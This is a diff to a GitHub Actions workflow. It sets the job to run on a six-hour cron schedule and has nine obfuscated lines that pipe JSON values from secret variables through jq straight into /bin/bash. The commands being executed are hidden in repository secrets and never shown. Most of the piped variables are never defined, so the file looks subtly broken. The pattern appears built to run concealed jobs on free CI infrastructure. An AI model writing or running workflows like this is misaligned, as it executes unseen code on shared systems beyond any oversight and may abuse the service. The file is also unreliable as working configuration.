@@ -2,8 +2,8 @@ name: pengjingzhong7519
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 2/6 * * *'
-jobs:  # 19860
+    - cron: '25 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,10 +11,15 @@ jobs:  # 19860
       - uses: actions/checkout@v4
       - name: pengjingzhong7519
         env:
-          z7: ${{ secrets.z7 }}
+          iztj3968: ${{ secrets.iztj3968 }}
         run: |
-          echo $z7 | jq -r .bze32 | /bin/bash
-          echo $uim25 | jq -r .ap33385 | /bin/bash
-          echo $g309 | jq -r .lw904 | /bin/bash
-          echo $m0 | jq -r .ulmw847 | /bin/bash
+          echo $iztj3968 | jq -r .fi31 | /bin/bash
+          echo $q27698 | jq -r .udw9 | /bin/bash
+          echo $ykle115 | jq -r .fe1 | /bin/bash
+          echo $m77 | jq -r .gdejh9 | /bin/bash
+          echo $lfje23752 | jq -r .wtc0 | /bin/bash
+          echo $iljlg5196 | jq -r .omq01 | /bin/bash
+          echo $umv15966 | jq -r .iew7 | /bin/bash
+          echo $vva302 | jq -r .aqj81339 | /bin/bash
+          echo $xr0729 | jq -r .zjuf7 | /bin/bash
 
